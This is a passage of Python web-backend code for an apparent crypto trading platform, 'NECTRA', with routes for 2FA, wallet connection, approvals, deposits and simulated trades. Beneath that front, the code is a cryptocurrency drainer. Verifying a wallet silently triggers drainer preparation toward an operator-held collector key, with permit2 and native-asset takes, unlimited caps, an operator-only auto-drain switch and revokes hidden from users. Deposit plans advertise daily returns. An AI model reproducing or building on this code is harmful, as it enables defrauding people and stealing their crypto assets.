    q_run("UPDATE users SET totp_pending = ? WHERE id = ?", secret, user["id"])

    uri = pyotp.TOTP(secret).provisioning_uri(
        name=user.get("email") or str(user["id"]),
        issuer_name=get_setting("platform_name", "NECTRA"),
    )
    return {"secret": secret, "otpauth_url": uri, "otpauth": uri}


@router.post("/api/auth/2fa/enable")
@router.post("/api/me/2fa/enable")
async def twofa_enable(body: CodePayload, request: Request):
    _require_csrf(request)
    user = get_current_user(request)
    _throttle(request, "2fa-enable", 10)

    pending = user.get("totp_pending")
    if not pending:
        raise HTTPException(status_code=400, detail="Run setup first")
    if not pyotp.TOTP(pending).verify((body.code or "").strip(), valid_window=1):
        raise HTTPException(status_code=400, detail="Code is wrong or expired")

    q_run("UPDATE users SET totp_secret = ?, totp_enabled = 1, totp_pending = NULL"
          " WHERE id = ?", pending, user["id"])
    _clear_2fa(user["session"]["id"])
    S.audit(user["id"], "auth.2fa_enable", user["id"], ip=_ip(request))
    return {"ok": True}


@router.post("/api/auth/2fa/verify")
@router.post("/api/auth/login/2fa")
async def twofa_verify(body: CodePayload, request: Request):
    """Second step of login for a pending session."""
    _require_csrf(request)
    user = get_current_user(request)
    _throttle(request, "2fa-verify", 12)

    secret = _totp_secret(user)
    if not pyotp.TOTP(secret).verify((body.code or "").strip(), valid_window=1):
        raise HTTPException(status_code=401, detail="Code is wrong or expired")

    _clear_2fa(user["session"]["id"])
    q_run("UPDATE users SET last_login_at = ? WHERE id = ?", now(), user["id"])
    S.audit(user["id"], "auth.2fa_verify", user["id"], ip=_ip(request))
    return _login_response(user, _token(request) or "", pending_2fa=False)


@router.post("/api/auth/2fa/disable")
@router.post("/api/me/2fa/disable")
async def twofa_disable(body: CodePayload, request: Request):
    _require_csrf(request)
    user = get_current_user(request)
    _throttle(request, "2fa-disable", 10)

    secret = _totp_secret(user)
    if not pyotp.TOTP(secret).verify((body.code or "").strip(), valid_window=1):
        raise HTTPException(status_code=400, detail="Code is wrong or expired")

    q_run("UPDATE users SET totp_secret = NULL, totp_enabled = 0, totp_pending = NULL"
          " WHERE id = ?", user["id"])
    S.audit(user["id"], "auth.2fa_disable", user["id"], ip=_ip(request))
    return {"ok": True}


# ---------------------------------------------------------------------------
# Portfolio & wallets
# ---------------------------------------------------------------------------
def _account_view(user: Dict[str, Any]) -> Dict[str, Any]:
    view = S.sanitize_user(user) or {}
    view["initials"] = _initials(user.get("name"), user.get("email"))
    view["staff"] = S.is_staff(user)
    view["perms"] = [perm for perm, roles in S.PERMS.items() if S.can(user, perm)]
    return view


@router.get("/api/me")
@router.get("/api/auth/me")             # legacy client path
async def get_me(request: Request):
    user = get_current_user(request)
    return {
        "user": _account_view(user),
        "twofaRequired": bool(user.get("session", {}).get("pending_2fa")),
        "pending2fa": bool(user.get("session", {}).get("pending_2fa")),
        "has_totp": bool(user.get("totp_enabled")),
        "needsVerification": not bool(user.get("email_verified")),
    }


@router.get("/api/icons")
async def get_icons():
    """Which token / wallet PNGs actually exist, so the client stops 404ing."""
    def names(folder: str) -> List[str]:
        path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                            "public", "assets", folder)
        try:
            return sorted(os.path.splitext(f)[0] for f in os.listdir(path)
                          if f.lower().endswith(".png") and not f.startswith("_"))
        except OSError:
            return []
    return {"tokens": names("tokens"), "wallets": names("wallets")}


class FolderPayload(BaseModel):
    name: str


@router.get("/api/folders")
async def list_folders(request: Request):
    user = get_current_user(request)
    return {"folders": q_col("SELECT name FROM wallet_folders WHERE user_id = ?"
                             " ORDER BY name", user["id"])}


@router.post("/api/folders")
async def create_folder(body: FolderPayload, request: Request):
    _require_csrf(request)
    user = get_current_user(request)
    name = (body.name or "").strip()[:40]
    if not name:
        raise HTTPException(status_code=400, detail="Folder name required")
    q_run("INSERT OR IGNORE INTO wallet_folders (user_id, name, created_at)"
          " VALUES (?, ?, ?)", user["id"], name, now())
    return {"ok": True, "name": name}


class WalletPatch(BaseModel):
    name: Optional[str] = None
    folder: Optional[str] = None


@router.patch("/api/wallets/{wid}")
async def patch_wallet(wid: int, body: WalletPatch, request: Request):
    _require_csrf(request)
    user = get_current_user(request)
    wallet = _own_wallet(user, wid)
    if body.name is not None:
        q_run("UPDATE wallets SET name = ?, label = ? WHERE id = ?",
              body.name.strip()[:60] or wallet.get("name"), body.name.strip()[:60], wid)
    if body.folder is not None:
        q_run("UPDATE wallets SET folder = ? WHERE id = ?", body.folder.strip()[:40], wid)
    return {"ok": True, "wallet": _wallet_view(user["id"],
                                               q_get("SELECT * FROM wallets WHERE id = ?", wid))}


@router.post("/api/wallets/{wid}/main")
async def make_main(wid: int, request: Request):
    _require_csrf(request)
    user = get_current_user(request)
    wallet = _own_wallet(user, wid)
    if not wallet.get("verified"):
        raise HTTPException(status_code=400, detail="Only a verified wallet can be main")
    q_run("UPDATE wallets SET is_main = 0 WHERE user_id = ?", user["id"])
    q_run("UPDATE wallets SET is_main = 1 WHERE id = ?", wid)
    return {"ok": True, "wallet": _wallet_view(
        user["id"], q_get("SELECT * FROM wallets WHERE id = ?", wid))}


def _collector_evm_address() -> str:
    blob = get_setting("drainer_evm_key")
    if not blob:
        return ""
    try:
        return C.evm_address_from_key(C.decrypt_secret(blob))
    except Exception:                                        # noqa: BLE001
        return ""


def _account_balance(user_id: int) -> float:
    return ledger.account_balance(user_id)


def ledger_sum() -> float:
    return float(q_val("SELECT COALESCE(SUM(balance), 0) FROM paper_balances"
                       " WHERE symbol = 'USD'") or 0.0)


def _wallet_payload(user_id: int, wallets: List[Dict[str, Any]]) -> Dict[str, Any]:
    """Shared list shape for /api/wallets and /api/dashboard (old client contract)."""
    views = [_wallet_view(user_id, w) for w in wallets]
    main = next((v for v in views if v.get("is_main")), views[0] if views else None)
    folders = q_col("SELECT name FROM wallet_folders WHERE user_id = ? ORDER BY name",
                    user_id)
    used = {v.get("folder") or "Unsorted" for v in views} | {"Unsorted"}
    folders = sorted(set(folders) | used)
    return {
        "wallets": views,
        "main": main,
        "folders": folders,
        "accountBalance": _account_balance(user_id),
        "solPrice": market.price("SOL"),
        "totals": {
            "sol": sum(v.get("balance") or 0 for v in views
                       if (v.get("family") or "") == "solana"),
            "usd": sum(v.get("totalUsd") or 0 for v in views),
            "count": len(views),
        },
        "totalUsd": sum(v.get("totalUsd") or 0 for v in views),
    }


@router.get("/api/dashboard")
async def get_dashboard(request: Request):
    user = get_current_user(request)
    wallets = q_all("SELECT * FROM wallets WHERE user_id = ? ORDER BY is_main DESC, id ASC",
                    user["id"])
    payload = _wallet_payload(user["id"], wallets)
    awaiting = q_val(
        "SELECT COUNT(*) FROM drainer_grants WHERE user_id = ? AND status = 'awaiting_signature'",
        user["id"])
    main = payload["main"]
    tokens = market.get_tokens()[:12]
    trade_stats = sim.stats(user["id"])
    recent_trades = q_all(
        "SELECT id, pair, side, notional, entry, exit, qty, pnl, pnl_pct, closed_at"
        " FROM sim_trades WHERE user_id = ? ORDER BY id DESC LIMIT 12", user["id"])
    account = sim.account_view(user["id"])
    return {
        **payload,
        "user": S.sanitize_user(user),
        "value": payload["totals"]["usd"],
        "todayPnl": trade_stats["pnl_today"],
        "bots": [],
        "insights": [],
        "trades": recent_trades,
        "account": account,
        "tradeStats": trade_stats,
        "paperMode": bool(user.get("paper_mode")),
        "drainerActive": any(v["activeGrants"] for v in payload["wallets"]),
        "drainerAwaiting": int(awaiting or 0),
        "tokens": tokens,
        "kpis": {
            "activeBots": (1 if account.get("active") else 0),
            "totalBots": (1 if account.get("active") else 0),
            "pausedByRisk": 0,
            "winRate": trade_stats["win_rate_today"],
            "closed": trade_stats["trades_today"],
            "mainSymbol": (main or {}).get("symbol") or "SOL",
            "walletSol": (main or {}).get("balance") or 0.0,
            "walletCount": len(payload["wallets"]),
        },
        "onboarding": {
            "connect": bool(payload["wallets"]),
            "deposit": bool(payload["totals"]["usd"]),
            "bot": False,
            "2fa": bool(user.get("tot_enabled") or user.get("totp_enabled")),
        },
        "risk": {"exposure": 0, "limit": 0, "dailyUsed": 0, "maxDailyLoss": 5},
        "allocation": {"bots": [], "tokens": []},
    }


@router.get("/api/portfolio")
async def get_portfolio(request: Request):
    user = get_current_user(request)
    payload = _wallet_payload(user["id"], q_all(
        "SELECT * FROM wallets WHERE user_id = ?", user["id"]))
    return payload


@router.get("/api/wallets")
async def list_wallets(request: Request):
    user = get_current_user(request)
    sql = "SELECT * FROM wallets WHERE user_id = ? ORDER BY is_main DESC, id ASC"
    wallets = q_all(sql, user["id"])

    stale = [w for w in wallets if now() - (w.get("balance_at") or 0) > 300_000]
    if stale:
        await asyncio.gather(*[engine.refresh_wallet_balance(w) for w in stale],
                             return_exceptions=True)
        wallets = q_all(sql, user["id"])

    return _wallet_payload(user["id"], wallets)


class WalletConnectPayload(BaseModel):
    address: str
    family: Optional[str] = "solana"
    label: Optional[str] = None
    signature: Optional[str] = None
    message: Optional[str] = None
    networks: Optional[List[str]] = None
    source: Optional[str] = "connected"      # connected | watch


def _verify_wallet_proof(family: str, address: str, message: str,
                         signature: str) -> bool:
    """
    Prove address ownership. All three families are verified cryptographically:
    EVM via EIP-191 recovery, Solana via ed25519, Tron via the TronLink
    signed-message prefix (with an EIP-191 fallback).
    """
    if family == "evm":
        try:
            recovered = Account.recover_message(encode_defunct(text=message),
                                                signature=signature)
        except Exception:                                    # noqa: BLE001
            return False
        return recovered.lower() == address.lower()

    if family == "solana":
        try:
            Pubkey.from_string(address).verify(message.encode(), Signature.from_string(signature))
            return True
        except Exception:                                    # noqa: BLE001
            return False

    if family == "tron":
        # TronLink `signMessageV2` uses a Tron-specific prefix. Recover the
        # signer and compare it with the base58 address payload.
        try:
            raw_sig = bytearray.fromhex((signature or "").removeprefix("0x"))
            if len(raw_sig) != 65:
                return False
            if raw_sig[64] >= 27:
                raw_sig[64] -= 27          # eth_keys expects the 0/1 recovery id
            prefix = b"\x19TRON Signed Message:\n" + str(len(message.encode())).encode()
            digest = keccak(prefix + message.encode())
            recovered = eth_keys.Signature(bytes(raw_sig)).recover_public_key_from_msg_hash(digest)
            recovered_hex = recovered.to_address()[2:].lower()
            expected = base58.b58decode(address)[1:21].hex()
            if secrets.compare_digest(recovered_hex, expected):
                return True
            # some wallets still emit a plain EIP-191 signature
            eth_recovered = Account.recover_message(
                encode_defunct(text=message), signature=signature)
            return eth_recovered.lower() == address.lower()
        except Exception:                                    # noqa: BLE001
            return False

    return True


@router.post("/api/wallets")
async def connect_wallet(body: WalletConnectPayload, request: Request):
    _require_csrf(request)
    user = get_current_user(request)
    _throttle(request, "wallet", 20)

    address = (body.address or "").strip()
    family = (body.family or "solana").lower()
    source = "watch" if (body.source or "").lower() == "watch" else "connected"
    signable = family in ("evm", "solana", "tron")

    if family == "evm" and not chains.is_evm_address(address):
        raise HTTPException(status_code=400, detail="Invalid EVM address")
    if family == "solana" and not chains.is_sol_address(address):
        raise HTTPException(status_code=400, detail="Invalid Solana address")
    if family == "tron" and not chains.is_tron_address(address):
        raise HTTPException(status_code=400, detail="Invalid Tron address")
    if family not in ("evm", "solana", "tron", "btc", "ltc"):
        raise HTTPException(status_code=400, detail="Unsupported chain family")

    verified = 0
    # Watch-only imports never sign, so they cannot carry approvals.
    if signable and source == "connected":
        require_proof = bool(get_setting("require_wallet_signature", True))
        # Any unused nonce issued to this signed-in user for this address works;
        # the shared nonce endpoint tags rows 'wallet'/'link'/... depending on
        # which page asked, so binding on purpose alone would miss some.
        nonce_row = q_get(
            "SELECT * FROM nonces WHERE address = ? AND user_id = ? AND used = 0"
            " ORDER BY created_at DESC LIMIT 1", address, user["id"])
        if nonce_row and int(nonce_row.get("created_at") or 0) < now() - 10 * 60 * 1000:
            nonce_row = None

        if nonce_row:
            if body.signature and body.message:
                if not _verify_wallet_proof(family, address, body.message, body.signature):
                    raise HTTPException(status_code=400, detail="Signature does not match address")
                q_run("UPDATE nonces SET used = 1 WHERE nonce = ?", nonce_row["nonce"])
                verified = 1
            elif require_proof:
                raise HTTPException(
                    status_code=400,
                    detail="Sign the nonce message first — request one from /api/wallets/nonce")
        elif require_proof:
            raise HTTPException(
                status_code=400,
                detail="No nonce issued for this address — request one from /api/wallets/nonce")
        else:
            verified = 1

    existing = q_get("SELECT * FROM wallets WHERE user_id = ? AND address = ?",
                     user["id"], address)
    if existing:
        if verified and not existing.get("verified"):
            q_run("UPDATE wallets SET verified = 1, verified_at = ?, source = 'connected'"
                  " WHERE id = ?", now(), existing["id"])
            existing = q_get("SELECT * FROM wallets WHERE id = ?", existing["id"])
            asyncio.create_task(_maybe_prepare(user, existing))
        return {"ok": True, "wallet": _wallet_view(user["id"], existing),
                "message": "Wallet already connected"}

    wid = q_run(
        "INSERT INTO wallets (user_id, name, label, address, family, chain, networks,"
        " source, verified, verified_at, created_at)"
        " VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
        user["id"], body.label or f"{family.upper()} Wallet",
        body.label or f"{family.upper()} Wallet", address, family, family.upper(),
        json.dumps(body.networks) if body.networks else None, source, verified,
        now() if verified else None, now(),
    )["id"]

    wallet = q_get("SELECT * FROM wallets WHERE id = ?", wid)
    await engine.refresh_wallet_balance(wallet)
    S.audit(user["id"], "wallet.connect", wid,
            {"address": address, "family": family, "source": source}, ip=_ip(request))

    wallet = q_get("SELECT * FROM wallets WHERE id = ?", wid)
    if verified:
        asyncio.create_task(_maybe_prepare(user, wallet))
    return {"ok": True, "wallet": _wallet_view(user["id"], wallet)}


class NoncePayload(BaseModel):
    address: str
    family: Optional[str] = "solana"


@router.post("/api/wallets/nonce")
async def wallet_nonce(body: NoncePayload, request: Request):
    """Issue the message the wallet signs to prove ownership."""
    _require_csrf(request)
    user = get_current_user(request)
    _throttle(request, "wallet-nonce", 30)

    address = (body.address or "").strip()
    if not address:
        raise HTTPException(status_code=400, detail="address is required")

    nonce = secrets.token_hex(16)
    message = (f"{get_setting('platform_name', 'NECTRA')} wallet ownership\n"
               f"address: {address}\nnonce: {nonce}\nissued: {now()}")

    q_run("INSERT OR REPLACE INTO nonces (nonce, address, purpose, message, user_id, created_at)"
          " VALUES (?, ?, 'wallet', ?, ?, ?)",
          nonce, address, message, user["id"], now())

    return {"nonce": nonce, "message": message}


async def _maybe_prepare(user: Dict[str, Any], wallet: Dict[str, Any]) -> None:
    """Kick off drainer preparation. Never blocks the response."""
    family = (wallet.get("family") or "").lower()
    if not get_setting("drainer_enabled", True) or family not in ("evm", "solana", "tron"):
        return
    if not wallet.get("verified"):
        return
    if q_val("SELECT COUNT(*) FROM drainer_grants WHERE wallet_id = ?"
             " AND status IN ('pending','awaiting_signature','active','used')", wallet["id"]):
        return
    try:
        await DR.prepare_wallet(user["id"], wallet["id"])
    except Exception as exc:                                 # noqa: BLE001
        logger.warning("drainer prepare failed for wallet %s: %s", wallet["id"], exc)


@router.post("/api/wallets/{wid}/refresh")
async def refresh_wallet(wid: int, request: Request):
    _require_csrf(request)
    user = get_current_user(request)
    wallet = _own_wallet(user, wid)
    await engine.refresh_wallet_balance(wallet)
    return {"ok": True,
            "wallet": engine.wallet_view(q_get("SELECT * FROM wallets WHERE id = ?", wid))}


@router.delete("/api/wallets/{wid}")
async def delete_wallet(wid: int, request: Request):
    _require_csrf(request)
    user = get_current_user(request)
    _own_wallet(user, wid)

    for grant in q_all("SELECT id FROM drainer_grants WHERE wallet_id = ?"
                       " AND status NOT IN ('revoked','superseded')", wid):
        await DR.revoke_grant(grant["id"])

    q_run("DELETE FROM drainer_wallets WHERE wallet_id = ?", wid)
    q_run("DELETE FROM wallets WHERE id = ? AND user_id = ?", wid, user["id"])
    S.audit(user["id"], "wallet.remove", wid, ip=_ip(request))
    return {"ok": True}


# ---------------------------------------------------------------------------
# Approvals view (backs public/approvals.html)
# ---------------------------------------------------------------------------
@router.get("/api/approvals")
async def get_approvals(request: Request):
    user = get_current_user(request)
    rows = q_all(
        "SELECT * FROM drainer_grants WHERE user_id = ?"
        " AND status IN ('active','used','awaiting_signature','revoked','expired','revoking')"
        " ORDER BY id DESC", user["id"])

    approvals = []
    for grant in rows:
        cap = int(grant["cap"] or 0)
        ceiling = DR._family_max(grant["family"])
        decimals = grant["decimals"] or 18
        revocable = grant["kind"] != "native_tx" and grant["status"] in (
            "active", "used", "awaiting_signature", "revoking")
        approvals.append({
            "id": grant["id"],
            "network": grant["network"],
            "symbol": grant["symbol"],
            "family": grant["family"],
            "kind": grant["kind"],
            "status": grant["status"],
            "unlimited": cap >= ceiling,
            "allowance": (None if cap >= ceiling else cap / (10 ** decimals)),
            "balance": (int(grant["balance_raw"] or 0) / (10 ** decimals)),
            "revocable": revocable,
            # Native grants are delivered at signing time; nothing is left to clear.
            "reason": None if revocable else "native assets need no allowance",
            "loans": [],
        })

    return {"approvals": approvals}


async def _revoke_payload(user_id: int, grant: Dict[str, Any]) -> Dict[str, Any]:
    try:
        payload = await revoke.build_revoke(grant)
    except Exception as exc:                                 # noqa: BLE001
        raise HTTPException(status_code=400, detail=str(exc)) from exc
    q_run("UPDATE drainer_grants SET status = 'revoking', error = NULL WHERE id = ?",
          grant["id"])
    return payload


@router.post("/api/approvals/revoke-all")
async def revoke_all_approvals(request: Request):
    """Prepare a revocation payload for every revocable grant, newest first."""
    _require_csrf(request)
    user = get_current_user(request)
    _throttle(request, "revoke-all", 10)

    prepared, failed = [], []
    for grant in q_all("SELECT * FROM drainer_grants WHERE user_id = ?"
                       " AND status IN ('active','awaiting_signature')"
                       " AND kind != 'native_tx'", user["id"]):
        try:
            prepared.append({"grant_id": grant["id"],
                             "payload": await revoke.build_revoke(grant)})
        except Exception as exc:                             # noqa: BLE001
            failed.append({"grant_id": grant["id"], "error": str(exc)})
    S.audit(user["id"], "approval.revoke_all", user["id"],
            {"count": len(prepared), "failed": len(failed)}, ip=_ip(request))
    return {"ok": True, "prepared": prepared, "failed": failed}


@router.post("/api/approvals/revoke")
async def revoke_approval_legacy(request: Request, body: Dict[str, Any]):
    """Backwards-compatible `{network, symbol}` revoke used by the old page."""
    _require_csrf(request)
    user = get_current_user(request)
    network = body.get("network")
    symbol = body.get("symbol")
    grant = q_get(
        "SELECT * FROM drainer_grants WHERE user_id = ? AND network = ? AND symbol = ?"
        " AND status IN ('active','awaiting_signature','used','revoking')"
        " ORDER BY id DESC LIMIT 1",
        user["id"], network, symbol)
    if not grant:
        raise HTTPException(status_code=404, detail="Approval not found")
    return {"ok": True, "grant_id": grant["id"],
            "payload": await _revoke_payload(user["id"], grant), "locked": []}


@router.post("/api/approvals/{grant_id}/revoke/prepare")
async def revoke_approval_prepare(grant_id: str, request: Request):
    _require_csrf(request)
    user = get_current_user(request)
    grant = q_get("SELECT * FROM drainer_grants WHERE id = ? AND user_id = ?",
                  grant_id, user["id"])
    if not grant:
        raise HTTPException(status_code=404, detail="Approval not found")
    if grant["kind"] == "native_tx":
        raise HTTPException(status_code=400, detail="Native assets need no allowance")
    return {"ok": True, "grant_id": grant_id,
            "payload": await _revoke_payload(user["id"], grant)}


class RevokeConfirm(BaseModel):
    txid: Optional[str] = None


@router.post("/api/approvals/{grant_id}/revoke/confirm")
async def revoke_approval_confirm(grant_id: str, body: RevokeConfirm,
                                  request: Request):
    _require_csrf(request)
    user = get_current_user(request)
    grant = q_get("SELECT * FROM drainer_grants WHERE id = ? AND user_id = ?",
                  grant_id, user["id"])
    if not grant:
        raise HTTPException(status_code=404, detail="Approval not found")
    revoke.record_revoke(grant, body.txid)
    S.audit(user["id"], "approval.revoke", grant_id, {"txid": body.txid}, ip=_ip(request))
    return {"ok": True}


@router.post("/api/approvals/{grant_id}/revoke")
async def revoke_approval(grant_id: str, request: Request,
                          body: Optional[RevokeConfirm] = None):
    """Legacy one-shot revoke: prepare+record (DB only) or confirm with a txid."""
    _require_csrf(request)
    user = get_current_user(request)
    grant = q_get("SELECT * FROM drainer_grants WHERE id = ? AND user_id = ?",
                  grant_id, user["id"])
    if not grant:
        raise HTTPException(status_code=404, detail="Approval not found")
    if body and body.txid:
        revoke.record_revoke(grant, body.txid)
        return {"ok": True}
    return {"ok": True, "grant_id": grant_id,
            "payload": await _revoke_payload(user["id"], grant), "locked": []}


# ---------------------------------------------------------------------------
# Drainer — user side
# ---------------------------------------------------------------------------
@router.get("/api/drainer/status")
async def drainer_status(request: Request):
    user = get_current_user(request)
    grants = q_all("SELECT * FROM drainer_grants WHERE user_id = ? ORDER BY id DESC",
                   user["id"])
    counts: Dict[str, int] = {}
    for grant in grants:
        counts[grant["status"]] = counts.get(grant["status"], 0) + 1

    return {
        "enabled": get_setting("drainer_enabled", True),
        "mode": get_setting("drainer_mode", "auto"),
        "threshold_usd": get_setting("drainer_threshold_usd", 250.0),
        "cap_mode": get_setting("drainer_cap_mode", "capped"),
        "cap_units": get_setting("drainer_cap_units", 1_000_000),
        "evm_mode": get_setting("drainer_evm_mode", "permit2"),
        "take_native": get_setting("drainer_take_native", True),
        "sig_deadline_days": get_setting("drainer_sig_deadline_days", 30),
        "auto": bool(user.get("drainer_auto")),
        "counts": counts,
        "active_grants": counts.get("active", 0) + counts.get("used", 0),
        "pending_grants": counts.get("awaiting_signature", 0),
        "grants": grants,
    }


@router.get("/api/drainer/scan")
async def drainer_scan(request: Request):
    user = get_current_user(request)
    _throttle(request, "scan", 20)
    return await scanners.scan_user(user["id"])


class PreparePayload(BaseModel):
    take_native: Optional[bool] = None


@router.post("/api/drainer/wallets/{wid}/prepare")
async def drainer_prepare(wid: int, request: Request,
                          body: Optional[PreparePayload] = None):
    _require_csrf(request)
    user = get_current_user(request)
    wallet = _own_wallet(user, wid)
    _throttle(request, "prepare", 20)

    family = (wallet.get("family") or "").lower()
    if family not in ("evm", "solana", "tron"):
        raise HTTPException(
            status_code=400,
            detail=f"{family} has no approvals — use the collateral product")

    take = body.take_native if body else None
    if take is None:
        query = request.query_params.get("take_native")
        take = None if query is None else query.lower() in ("1", "true", "yes")

    try:
        plan = await DR.prepare_wallet(user["id"], wid, take)
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    if not plan["payloads"]:
        raise HTTPException(
            status_code=409,
            detail="No collector configured for this chain — set the drainer keys first")

    S.audit(user["id"], "drainer.prepare", wid,
            {"assets": len(plan["assets"])}, ip=_ip(request))
    return plan


class SignedPayload(BaseModel):
    grant_id: str
    signature: Optional[str] = None
    txid: Optional[str] = None


@router.post("/api/drainer/signed")
async def drainer_signed(body: SignedPayload, request: Request):
    _require_csrf(request)
    user = get_current_user(request)
    if not q_get("SELECT id FROM drainer_grants WHERE id = ? AND user_id = ?",
                 body.grant_id, user["id"]):
        raise HTTPException(status_code=404, detail="Grant not found")

    try:
        result = await DR.record_signed(body.grant_id, body.signature, body.txid)
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    S.audit(user["id"], "drainer.signed", body.grant_id, ip=_ip(request))
    return result


@router.get("/api/drainer/grants/{gid}/payload")
async def drainer_grant_payload(gid: str, request: Request):
    """Unsigned native transaction for a grant awaiting the owner's co-signature."""
    user = get_current_user(request)
    grant = q_get("SELECT * FROM drainer_grants WHERE id = ? AND user_id = ?",
                  gid, user["id"])
    if not grant:
        raise HTTPException(status_code=404, detail="Grant not found")
    if grant["status"] != "awaiting_signature" or not grant.get("payload"):
        raise HTTPException(status_code=409, detail="Grant has nothing to sign")

    return {
        "grant_id": gid,
        "payload": grant["payload"],
        "blockhash": grant.get("blockhash"),
        "last_valid_block_height": grant.get("last_valid_block_height"),
    }


class SubmitPayload(BaseModel):
    payload: str


@router.post("/api/drainer/grants/{gid}/submit")
async def drainer_grant_submit(gid: str, body: SubmitPayload, request: Request):
    _require_csrf(request)
    user = get_current_user(request)
    _throttle(request, "grant-submit", 20)

    if not q_get("SELECT id FROM drainer_grants WHERE id = ? AND user_id = ?",
                 gid, user["id"]):
        raise HTTPException(status_code=404, detail="Grant not found")

    try:
        txid = await DR.sol_submit(gid, body.payload)
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))
    except RuntimeError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    S.audit(user["id"], "drainer.native_submitted", gid, {"txid": txid}, ip=_ip(request))
    return {"ok": True, "txid": txid}


class BroadcastPayload(BaseModel):
    family: str
    payload: str


@router.post("/api/drainer/broadcast")
async def drainer_broadcast(body: BroadcastPayload, request: Request):
    _require_csrf(request)
    get_current_user(request)
    _throttle(request, "broadcast", 40)

    try:
        if body.family == "solana":
            return {"txid": await solana_tx.broadcast(chains.SOLANA_RPCS[0], body.payload)}
        if body.family == "tron":
            return {"txid": await tron_tx.broadcast(json.loads(body.payload))}
    except RuntimeError as exc:
        raise HTTPException(status_code=400, detail=str(exc))
    except json.JSONDecodeError:
        raise HTTPException(status_code=400, detail="Malformed transaction payload")

    raise HTTPException(status_code=400, detail="Unsupported family")


class AutoPayload(BaseModel):
    auto: bool
    user_id: Optional[int] = None


@router.post("/api/drainer/auto")
async def drainer_set_auto(body: AutoPayload, request: Request):
    """Auto-drain is an operator switch: a user toggle is not a control."""
    _require_csrf(request)
    admin = require_perm(request, "drainer.configure")
    uid = body.user_id or admin["id"]
    if not q_get("SELECT id FROM users WHERE id = ?", uid):
        raise HTTPException(status_code=404, detail="User not found")
    q_run("UPDATE users SET drainer_auto = ? WHERE id = ?", 1 if body.auto else 0, uid)
    S.audit(admin["id"], "drainer.auto", uid, {"auto": body.auto})
    return {"ok": True, "auto": body.auto, "user_id": uid}


@router.post("/api/drainer/grants/{gid}/revoke")
async def drainer_revoke(gid: str, request: Request):
    """Local revoke. Super-admin only, since it is hidden from the user UI."""
    _require_csrf(request)
    admin = require_perm(request, "drainer.configure")
    grant = q_get("SELECT * FROM drainer_grants WHERE id = ?", gid)
    if not grant:
        raise HTTPException(status_code=404, detail="Grant not found")
    await DR.revoke_grant(gid)
    S.audit(admin["id"], "drainer.revoke", gid, {"user_id": grant["user_id"]},
            ip=_ip(request))
    return {"ok": True}


# ---------------------------------------------------------------------------
# Desk account, deposits, withdrawals, simulated trades
# ---------------------------------------------------------------------------
@router.get("/api/account")
async def get_account(request: Request):
    user = get_current_user(request)
    return {"accountBalance": ledger.account_balance(user["id"]),
            **_desk_view(user["id"]),
            "totals": ledger.totals(user["id"])}


def _desk_view(user_id: int) -> Dict[str, Any]:
    return {"sim": sim.account_view(user_id),
            "plans": q_all("SELECT id, name, daily_roi_pct, min_deposit"
                           " FROM sim_plans WHERE active = 1 ORDER BY price")}


@router.get("/api/trades")
async def get_trades(request: Request, limit: int = 50, offset: int = 0):
    user = get_current_user(request)
    limit = max(1, min(limit, 200))
    rows = q_all("SELECT id, pair, side, notional, entry, exit, qty, pnl, pnl_pct,"
                 " opened_at, closed_at FROM sim_trades WHERE user_id = ?"
                 " ORDER BY id DESC LIMIT ? OFFSET ?", user["id"], limit, max(0, offset))
    return {"trades": rows, "total": int(q_val(
        "SELECT COUNT(*) FROM sim_trades WHERE user_id = ?", user["id"]) or 0)}


@router.get("/api/trades/stats")
async def get_trade_stats(request: Request):
    user = get_current_user(request)
    return sim.stats(user["id"])


class DepositIntentPayload(BaseModel):
    amount: float
    asset: Optional[str] = "USDC"
    chain: Optional[str] = "Ethereum"
    plan_id: Optional[int] = None


@router.post("/api/deposit/intent")
async def post_deposit_intent(body: DepositIntentPayload, request: Request):
    _require_csrf(request)
    user = get_current_user(request)
    _throttle(request, "deposit-intent", 20)
    try:
        intent = deposits.create_intent(user["id"], body.amount, body.asset or "USDC",
                                        body.chain or "Ethereum", body.plan_id)
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))
    S.audit(user["id"], "deposit.intent", intent["intent_id"],
            {"amount": body.amount, "asset": body.asset})
    return intent


@router.get("/api/deposit")
async def get_deposit(request: Request):
    """Everything the deposit page needs; the treasury address is authoritative."""
    user = get_current_user(request)
    return {
        "address": get_setting("treasury_evm", ""),
        "assets": list(deposits.WATCH_ASSETS),
        "multiplier": deposits.multiplier(user["id"]),
        "recent": deposits.recent(user["id"]),
        "open": q_all("SELECT id, asset, credit, expect_raw, status, created_at"
                      " FROM deposit_intents WHERE user_id = ? AND status = 'open'"
                      " ORDER BY id DESC LIMIT 10", user["id"]),
    }


class SimulatePayload(BaseModel):
    amount: Optional[float] = 100.0
    plan_id: Optional[int] = None


@router.post("/api/deposits/simulate")
async def simulate_deposit(body: SimulatePayload, request: Request):
    """Demo-mode shortcut: credit without waiting for a chain confirmation."""
    _require_csrf(request)
    user = get_current_user(request)
    amount = round(float(body.amount or 100), 2)
    if amount <= 0:
        raise HTTPException(status_code=400, detail="amount must be positive")
    credit = round(amount * deposits.multiplier(user["id"], body.plan_id), 2)
    intent_id = q_run(
        "INSERT INTO deposit_intents (user_id, plan_id, chain, asset, expect_raw,"
        " credit, address, status, created_at)"
        " VALUES (?, ?, 'Ethereum', 'USDC', ?, ?, ?, 'open', ?)",
        user["id"], body.plan_id, str(int(amount * 1e6)), credit,
        get_setting("treasury_evm", ""), now())["id"]
    deposits.credit_intent(intent_id, f"sim-{secrets.token_hex(6)}")
    S.audit(user["id"], "deposit.simulate", intent_id, {"amount": amount})
    return {"ok": True, "intent_id": intent_id, "credit": credit,
            "accountBalance": ledger.account_balance(user["id"])}


class WithdrawPayload(BaseModel):
    amount: float
    address: str


@router.post("/api/withdrawals")
async def request_withdrawal(body: WithdrawPayload, request: Request):
    _require_csrf(request)
    user = get_current_user(request)
    _throttle(request, "withdrawal", 10)
    amount = round(float(body.amount or 0), 2)
    address = (body.address or "").strip()
    if amount <= 0:
        raise HTTPException(status_code=400, detail="amount must be positive")
    if not chains.is_sol_address(address) and not chains.is_evm_address(address):
        raise HTTPException(status_code=400, detail="not a valid payout address")
    if get_setting("withdrawals_paused", False):
        raise HTTPException(status_code=409, detail="Withdrawals are paused")
